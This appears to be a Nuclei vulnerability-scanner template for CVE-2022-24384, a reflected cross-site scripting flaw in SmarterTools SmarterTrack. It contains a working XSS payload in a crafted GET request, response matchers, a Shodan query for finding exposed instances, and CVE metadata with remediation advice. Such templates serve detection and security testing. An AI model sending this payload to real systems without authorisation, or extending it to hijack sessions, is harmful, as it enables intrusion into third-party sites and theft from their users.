http:
- matchers:
  - condition: and
    type: word
    words:
    - '"type":"error","text":"Unknown survey\"><img src=x onerror=alert(document.domain)>"'
    - smartertrack
  raw:
  - 'GET /Main/Default.aspx?viewSurveyError=Unknown+survey"><img%20src=x%20onerror=alert(document.domain)>
    HTTP/1.1

    Host: {{Hostname}}


    '
id: CVE-2022-24384
info:
  author: E1A
  classification:
    cpe: cpe:2.3:a:smartertools:smartertrack:*:*:*:*:*:*:*:*
    cve-id: CVE-2022-24384
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
    cvss-score: 6.1
    cwe-id: CWE-79
    epss-percentile: 0.34922
    epss-score: 0.00084
  description: 'Cross-site Scripting (XSS) vulnerability in SmarterTools SmarterTrack
    This issue affects: SmarterTools SmarterTrack 100.0.8019.14010.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary script code in the context of the victim''s browser, potentially
    leading to session hijacking, defacement, or theft of sensitive information.

    '
  metadata:
    max-request: 1
    product: smartertrack
    shodan-query: http.favicon.hash:1410071322
    vendor: smartertools
    verified: true
  name: SmarterTools SmarterTrack - Cross-Site Scripting
  reference:
  - https://csirt.divd.nl/CVE-2022-24384
  - https://csirt.divd.nl/DIVD-2021-00029
  remediation: 'Apply the latest security patches or updates provided by SmarterTools
    to fix this vulnerability.

    '
  severity: medium
  tags: cve,cve2022,xss,smartertrack,smartertools
